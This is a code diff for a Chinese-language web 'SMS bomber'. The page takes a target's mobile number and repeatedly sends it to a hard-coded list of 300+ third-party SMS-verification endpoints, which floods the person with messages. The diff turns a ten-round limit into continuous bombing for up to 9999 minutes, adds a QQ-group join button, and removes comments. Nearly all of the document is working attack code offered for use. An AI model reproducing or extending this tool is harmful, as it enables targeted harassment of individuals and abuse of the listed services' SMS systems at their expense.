@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>短信轰炸机 · 网页版</title>
+    <title>短信轰炸机 · 持续版</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -71,9 +71,10 @@
         .row label {
             color: #aaa;
             font-size: 14px;
+            white-space: nowrap;
         }
         .row input[type="number"] {
-            width: 60px;
+            width: 80px;
             background: #2a2a2a;
             border: 1px solid #3a3a3a;
             border-radius: 6px;
@@ -82,10 +83,14 @@
             text-align: center;
             font-size: 14px;
         }
+        .row .hint {
+            color: #666;
+            font-size: 12px;
+            margin-left: auto;
+        }
         .btn {
             width: 100%;
             padding: 14px;
-            background: #007aff;
             border: none;
             border-radius: 8px;
             color: #fff;
@@ -95,11 +100,19 @@
             transition: background 0.2s;
             margin-bottom: 8px;
         }
-        .btn:disabled {
+        .btn-primary {
+            background: #007aff;
+        }
+        .btn-primary:not(:disabled):hover { background: #005bbf; }
+        .btn-primary:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
-        .btn:not(:disabled):hover { background: #005bbf; }
+        .btn-qq {
+            background: #12b7f5;
+        }
+        .btn-qq:hover { background: #0a8fc2; }
+        .btn-qq:active { background: #0873a0; }
         .status {
             text-align: center;
             font-size: 14px;
@@ -120,15 +133,21 @@
             word-break: break-all;
             line-height: 1.6;
             border: 1px solid #2a2a2a;
+            margin-top: 8px;
         }
         .log::-webkit-scrollbar { width: 4px; }
         .log::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
     </style>
 </head>
 <body>
 <div class="card">
     <h1>💣 短信轰炸机</h1>
-    <div class="sub">300+ 接口 · 毫秒级并发</div>
+    <div class="sub">300+ 接口 · 持续轰炸</div>
 
     <div class="input-group">
         <input type="password" id="phoneInput" placeholder="手机号" maxlength="11" inputmode="numeric">
@@ -136,11 +155,16 @@
     </div>
 
     <div class="row">
-        <label for="roundsInput">轮数：</label>
-        <input type="number" id="roundsInput" value="1" min="1" max="10">
+        <label for="minutesInput">持续分钟：</label>
+        <input type="number" id="minutesInput" value="1" min="1" max="9999">
+        <span class="hint">1 ~ 9999</span>
     </div>
 
-    <button class="btn" id="sendBtn">开始轰炸</button>
+    <div class="btn-group">
+        <button class="btn btn-primary" id="sendBtn">开始轰炸</button>
+        <button class="btn btn-qq" id="qqBtn">💬 加入QQ群</button>
+    </div>
+
     <div class="status" id="statusLabel">就绪</div>
     <div class="log" id="logArea">[系统] 加载接口中...</div>
 </div>
@@ -150,9 +174,8 @@
     // 1. 接口列表（完整提取自 OC 源码，共计 POST ~120 个 + GET ~200+ 个）
     // =========================================================================
 
-    // ---------- 1.1 POST 接口（全部从 postDicts 转换） ----------
+    // ---------- 1.1 POST 接口 ----------
     const postDicts = [
-        // 第一组：标准 JSON 接口（约 80 个）
         { url: "https://yjhi.jihesh.com/api/app/code", data: { token: "", platform: "APP", lang: "zh-CN", phone: "[phone]", event: "reg" }, header: { "Content-Type": "application/json;charset=utf-8" } },
         { url: "https://pdf.kfsafe.cn/sms/phone/code", data: { phone: "[phone]" }, header: { "Content-Type": "application/json;charset=utf-8" } },
         { url: "https://biz.caiyunapp.com/v1/send_sms_code", data: { phone_num: "[phone]", area_code: "86" }, header: { "Referer": "https://fanyi.caiyunapp.com/", "Cy-Token": "token 9876032166" } },
@@ -214,10 +237,8 @@
         { url: "http://101.132.126.166:8080/message/sendVerifyCode?callback=successCallback&mobilePhone=[phone]&t=1589625247333action_type=regist&mobile=[phone]", data: {}, header: {} },
         { url: "https://www.renrendoc.com/Reg.aspx/GetUserSMSCode", data: { userMobile: "[phone]" }, header: { "Content-Type": "application/json; charset=UTF-8", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "X-Requested-With": "XMLHttpRequest" } },
         { url: "http://www.cuour.org/edu_cloud/sms_send", data: { to: "[phone]", sms_type: "sms_registration" }, header: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie": "PHPSESSID=20pi9ugtg1tboucsjcc8ute6t9", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "X-CSRF-Token": "7--b2sxDUBm-Jd2yf_5KYrf7Hw2w_M6BDhSJq-H2GjY", "X-Requested-With": "XMLHttpRequest" } },
-        // 从第二个JSON数组提取
         { url: "http://www.tmsf.com/mem/WebMemLoginAction_saveMemMobileCodeImg.jspx?usermobile=[phone]&imagecode=", data: {}, header: { "Referer": "http://www.tmsf.com/esf/esfnSearch_communityListUpgrade.htm", "X-Requested-With": "XMLHttpRequest" } },
         { url: "https://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=https%3A%2F%2Flogin.ztgame.com%2F&cururl=http%3A%2F%2Freg.ztgame.com%2F&phone=[phone]&mpcode=&pwd=&tname=&idcard=", data: {}, header: { "Referer": "https://reg.ztgame.com/", "X-Requested-With": "XMLHttpRequest" } },
-        // 从第三个JSON数组提取（去重后新增）
         { url: "https://www.maiwe.com.cn/index/sendcode.html", data: { tel: "[phone]" }, header: {} },
         { url: "https://www.dehua.net/include/ajax.php?service=siteConfig&action=getphoneVerify&type=signup&phone=[phone]&areaCode=86", data: {}, header: {} },
         { url: "https://user.daojia.com/mobile/getcode?mobile=[phone]&newVersion=1&bu=112", data: {}, header: {} },
@@ -227,12 +248,9 @@
         { url: "http://www.yddzgc.com/bid-app/api/sys/code?phone=[phone]&type=1", data: {}, header: {} },
         { url: "http://zhuanjipx.com:8082//api-user/zjUsersPersonal/getSmsCode?mobile=[phone]&mobileCodeId=685110c6-cef4-bb01-8f4d-19ea89f4d3f8", data: {}, header: {} },
         { url: "https://uc.csdhe.com/v1/sms/send?mobile=[phone]&apptype=examWeb", data: {}, header: {} },
-        // 从第五个JSON数组提取（福州久邻信息等）-- 前两个与前面重复，略
-        // 从JS函数列表提取的部分（仅提取可直接调用的）
         { url: "http://www.900ppt.com/api/login/getSmsCode", data: { phone: "[phone]", easy: "1" }, header: {} },
         { url: "http://test.marketing.i.vipcode.com/api/marketing/dataStatistics/sendCode", data: { phone: "[phone]" }, header: {} },
         { url: "https://editor.588ku.com/site-api/send-tel-login-code", data: { num: "[phone]" }, header: {} },
-        // 其他遗漏：
         { url: "http://47.103.35.255:510/api/Account/SendRestigerSms", data: { tel: "[phone]" }, header: {} },
         { url: "http://israel.selectshandong.com/user/verification_code/send.html", data: { mobile: "[phone]" }, header: {} },
         { url: "https://www.kuaijiexi.com/sendPhoneMessage", data: { mobile: "[phone]" }, header: {} },
@@ -254,7 +272,7 @@
         { url: "http://www.laosjgyl.com/register/sendCaptcha", data: { mobile: "[phone]" }, header: {} }
     ];
 
-    // ---------- 1.2 GET 接口（全部从 getUrls 转换） ----------
+    // ---------- 1.2 GET 接口 ----------
     const getUrls = [
         "http://101.132.126.166:8080/message/sendVerifyCode?callback=successCallback&mobilePhone=[phone]&t=1589625247333action_type=regist&mobile=[phone]",
         "http://12345.panzhihua.gov.cn/sms/getSMSCode?mobile=[phone]",
@@ -811,9 +829,19 @@
     ];
 
     // =========================================================================
-    // 2. 工具与主逻辑
+    // 2. 核心逻辑
     // =========================================================================
 
+    // 构造完整接口列表
+    const apis = [];
+    postDicts.forEach(d => {
+        apis.push({ url: d.url, method: 'POST', data: d.data, header: d.header || {} });
+    });
+    getUrls.forEach(url => {
+        apis.push({ url, method: 'GET', data: {}, header: {} });
+    });
+
+    // 工具函数：日志
     function appendLog(msg, phone) {
         const log = document.getElementById('logArea');
         const now = new Date();
@@ -833,17 +861,15 @@
         log.scrollTop = log.scrollHeight;
     }
 
+    // 占位符替换
     function interpolate(str, phone) {
         return str.replace(/\[phone\]/g, phone);
     }
 
+    // 构建请求体
     function buildBody(data, headers) {
-        const contentType = headers['Content-Type'] || '';
-        if (typeof data === 'string') {
-            return data;
-        }
+        if (typeof data === 'string') return data;
         if (typeof data === 'object') {
-            // 原 OC 逻辑：无论 header 中的 Content-Type，对于字典一律使用 URL-encoded
             const params = new URLSearchParams();
             for (const [k, v] of Object.entries(data)) {
                 params.append(k, v);
@@ -853,6 +879,7 @@
         return '';
     }
 
+    // 单个请求发送
     function sendRequest(api, phone) {
         return new Promise((resolve) => {
             let url = interpolate(api.url, phone);
@@ -865,11 +892,8 @@
                     ? interpolate(api.data, phone)
                     : api.data;
                 body = buildBody(rawData, headers);
-                // 强制设置 Content-Type 为 x-www-form-urlencoded（与原 OC 一致）
                 headers['Content-Type'] = 'application/x-www-form-urlencoded';
-                // 如果原 header 有指定其他类型，但 OC 会覆盖，这里保持一致
             } else if (method === 'GET') {
-                // 若有 data 对象，拼接到 URL（极少见，但保留）
                 if (api.data && typeof api.data === 'object') {
                     const params = new URLSearchParams(api.data);
                     const query = params.toString();
@@ -886,29 +910,28 @@
             .then(res => {
                 resolve({ success: res.status >= 200 && res.status < 300, status: res.status });
             })
-            .catch(err => {
-                resolve({ success: false, status: -1, error: err.message });
+            .catch(() => {
+                resolve({ success: false, status: -1 });
             });
         });
     }
 
-    // 加载接口
-    const apis = [];
-    postDicts.forEach(d => {
-        apis.push({ url: d.url, method: 'POST', data: d.data, header: d.header || {} });
-    });
-    getUrls.forEach(url => {
-        apis.push({ url, method: 'GET', data: {}, header: {} });
-    });
-    appendLog(`🔥 加载接口 ${apis.length} 个`, '');
+    // =========================================================================
+    // 3. UI控制
+    // =========================================================================
 
-    // UI 元素
     const phoneInput = document.getElementById('phoneInput');
     const eyeBtn = document.getElementById('eyeBtn');
-    const roundsInput = document.getElementById('roundsInput');
+    const minutesInput = document.getElementById('minutesInput');
     const sendBtn = document.getElementById('sendBtn');
     const statusLabel = document.getElementById('statusLabel');
+    const qqBtn = document.getElementById('qqBtn');
+    const logArea = document.getElementById('logArea');
 
+    // 显示加载完成
+    appendLog(`🔥 加载接口 ${apis.length} 个`, '');
+
+    // 眼睛切换
     let isPhoneVisible = false;
     eyeBtn.addEventListener('click', () => {
         isPhoneVisible = !isPhoneVisible;
@@ -916,12 +939,19 @@
         eyeBtn.textContent = isPhoneVisible ? '🙈' : '👁';
     });
 
+    // 点击空白收起键盘
     document.addEventListener('click', (e) => {
         if (e.target.tagName !== 'INPUT') {
             document.activeElement?.blur();
         }
     });
 
+    // QQ群跳转
+    qqBtn.addEventListener('click', () => {
+        window.open('https://qm.qq.com/q/5icZm5FoM8', '_blank');
+    });
+
+    // 轰炸主逻辑（持续分钟）
     sendBtn.addEventListener('click', async () => {
         const phone = phoneInput.value.trim();
         if (!/^1\d{10}$/.test(phone)) {
@@ -929,34 +959,46 @@
             statusLabel.style.color = '#f44';
             return;
         }
-        let rounds = parseInt(roundsInput.value) || 1;
-        if (rounds < 1) rounds = 1;
-        if (rounds > 10) rounds = 10;
-        roundsInput.value = rounds;
+        let minutes = parseInt(minutesInput.value) || 1;
+        if (minutes < 1) minutes = 1;
+        if (minutes > 9999) minutes = 9999;
+        minutesInput.value = minutes;
 
+        // 禁用按钮，防止重复点击
         sendBtn.disabled = true;
-        statusLabel.textContent = `⏳ 开始轰炸，共 ${rounds} 轮...`;
+        statusLabel.textContent = `⏳ 持续轰炸中，剩余 ${minutes} 分钟...`;
         statusLabel.style.color = '#6af';
         appendLog(`📱 手机号: ${phone}`, phone);
-        appendLog(`🔢 轮数: ${rounds} (全部并发)`, phone);
+        appendLog(`⏱️ 持续 ${minutes} 分钟`, phone);
 
+        const startTime = Date.now();
+        const endTime = startTime + minutes * 60 * 1000;
         let successTotal = 0;
         let failTotal = 0;
 
-        const allPromises = [];
-        for (let r = 1; r <= rounds; r++) {
-            for (const api of apis) {
-                allPromises.push(sendRequest(api, phone));
-            }
+        // 循环发送，直到超时
+        while (Date.now() < endTime) {
+            // 计算剩余时间
+            const remaining = Math.max(0, Math.ceil((endTime - Date.now()) / 1000));
+            const remainingMin = Math.floor(remaining / 60);
+            const remainingSec = remaining % 60;
+            statusLabel.textContent = `⏳ 持续轰炸中，剩余 ${remainingMin}分${remainingSec}秒...`;
+
+            // 发送一轮所有接口
+            const promises = apis.map(api => sendRequest(api, phone));
+            const results = await Promise.all(promises);
+            results.forEach(res => {
+                if (res.success) successTotal++;
+                else failTotal++;
+            });
+
+            // 每轮结束后立即检查时间，如果未结束则继续下一轮
+            // 为防止死循环，若时间已到则退出
         }
 
-        const results = await Promise.all(allPromises);
-        results.forEach(res => {
-            if (res.success) successTotal++;
-            else failTotal++;
-        });
-
-        const msg = `✅ 完成！成功 ${successTotal} 个，失败 ${failTotal} 个`;
+        // 结束统计
+        const elapsed = Math.round((Date.now() - startTime) / 1000);
+        const msg = `✅ 完成！持续 ${elapsed} 秒，成功 ${successTotal} 个，失败 ${failTotal} 个`;
         statusLabel.textContent = msg;
         statusLabel.style.color = '#0f0';
         appendLog(msg, phone);
